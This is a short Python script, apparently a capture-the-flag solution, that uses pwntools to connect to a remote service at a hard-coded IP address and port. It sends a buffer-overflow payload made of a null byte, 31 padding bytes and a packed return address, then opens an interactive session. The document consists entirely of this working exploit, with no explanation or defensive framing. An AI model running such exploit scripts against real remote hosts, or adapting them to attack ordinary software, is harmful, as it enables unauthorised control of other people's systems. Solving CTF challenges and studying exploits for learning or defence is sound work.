from pwn import *

#p=process("./prob1")
p=remote("220.249.52.134",56114)

p.recv()
p.sendline("a")
p.recv()
p.sendline("\x00"+"A"*31+p32(0x80486cc))
p.interactive()
